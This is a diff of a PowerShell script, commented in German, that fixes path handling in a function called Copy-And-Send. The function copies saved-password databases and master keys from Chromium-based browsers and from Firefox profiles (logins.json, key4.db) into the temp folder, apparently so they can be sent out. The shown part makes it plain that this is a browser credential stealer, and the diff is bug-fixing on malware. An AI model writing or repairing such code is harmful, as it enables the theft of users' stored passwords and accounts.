@@ -16,8 +16,8 @@ function Copy-And-Send {
         [string]$profileName = ""
     )
 
-    $tempDb = "$env:TEMP\${browserName}_${profileName}_Login Data"
-    $tempMasterKey = "$env:TEMP\${browserName}_${profileName}_MasterKey"
+    $tempDb = [System.IO.Path]::Combine($env:TEMP, "${browserName}_${profileName}_Login Data")
+    $tempMasterKey = [System.IO.Path]::Combine($env:TEMP, "${browserName}_${profileName}_MasterKey")
 
     # Kopieren der Datenbank und des Masterkeys, um Sperren zu vermeiden
     if (Test-Path $dbPath) {
@@ -88,8 +88,8 @@ if (Test-Path $firefoxProfileDir) {
     $profiles = Get-ChildItem -Path $firefoxProfileDir -Directory
     foreach ($profile in $profiles) {
         $profileName = $profile.Name
-        $dbPath = "$profile.FullName\logins.json"
-        $masterKeyPath = "$profile.FullName\key4.db"
+        $dbPath = "$($profile)\logins.json"
+        $masterKeyPath = "$($profile)\key4.db"
         Copy-And-Send -browserName "Firefox" -dbPath $dbPath -masterKeyPath $masterKeyPath -profileName $profileName
     }
 } else {
